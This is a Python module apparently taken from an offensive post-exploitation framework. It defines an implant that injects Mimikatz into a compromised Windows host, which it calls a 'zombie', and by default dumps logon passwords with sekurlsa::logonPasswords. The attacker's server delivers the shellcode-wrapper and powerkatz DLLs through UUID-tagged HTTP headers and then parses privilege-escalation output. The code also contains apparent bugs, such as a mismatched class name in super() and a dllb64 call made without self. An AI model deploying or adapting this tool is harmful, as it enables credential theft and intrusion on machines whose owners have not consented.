import core.implant
import core.job
import string

class DotNet2JSJob(core.job.Job):
    def create(self):
        self.fork32Bit = True

    def parse_mimikatz(self, data):
        full_data = data
        data = data.split("mimikatz(powershell) # ")[1]
        if "token::elevate" in data and "Impersonated !" in data:
            self.print_good("token::elevate -> got SYSTEM!")
            return

        if "privilege::debug" in data and "OK" in data:
            self.print_good("privilege::debug -> got SeDebugPrivilege!")
            return

        self.mimi_output = data
        #self.display()
        #self.print_good(full_data)

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("DLLUUID"):
            handler.send_file(self.options.get("DYNWRAPXDLL"))
            return

        if task == self.options.get("MANIFESTUUID"):
            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
            return

        if task == self.options.get("SHIMX64UUID"):
            handler.send_file(self.options.get("SHIMX64DLL"))

        if task == self.options.get("MIMIX64UUID"):
            handler.send_file(self.options.get("MIMIX64DLL"))

        if task == self.options.get("MIMIX86UUID"):
            handler.send_file(self.options.get("MIMIX86DLL"))

        if len(data) == 0:
            handler.reply(200)
            return

        if "mimikatz(powershell) # " in data:
            self.parse_mimikatz(data)
            handler.reply(200)
            return

        if data == "Complete":
            super(DynWrapXShellcodeJob, self).report(handler, data)

        #self.print_good(data)

        handler.reply(200)

    def done(self):
        self.display()

    def display(self):
        try:
            self.print_good(self.mimi_output)
        except:
            pass
        #self.shell.print_plain(str(self.errno))

class DynWrapXShellcodeImplant(core.implant.Implant):

    NAME = "Shellcode via Dynamic Wrapper X"
    DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object"
    AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki", "tiraniddo"]

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("MIMICMD", "sekurlsa::logonPasswords", "What Mimikatz command to run?", required=True)

        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)

        self.options.register("SHIMX86B64", "", "calculated bytes for arr_DLL", hidden=True)

        self.options.register("SHIMX86OFFSET", "6217", "Offset to the reflective loader", advanced = True)

    def dllb64(self, path):
        import base64
        with open(path, 'rb') as fileobj:
            return base64.b64encode(fileobj.read())

    def run(self):

        import uuid
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX86UUID", uuid.uuid4().hex)


        self.options.set("SHIMX86BYTES", dllb64(self.options.get("SHIMX86DLL")))

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dotnet2js.js", self.options)

        self.dispatch(workloads, DotNet2JSJob)
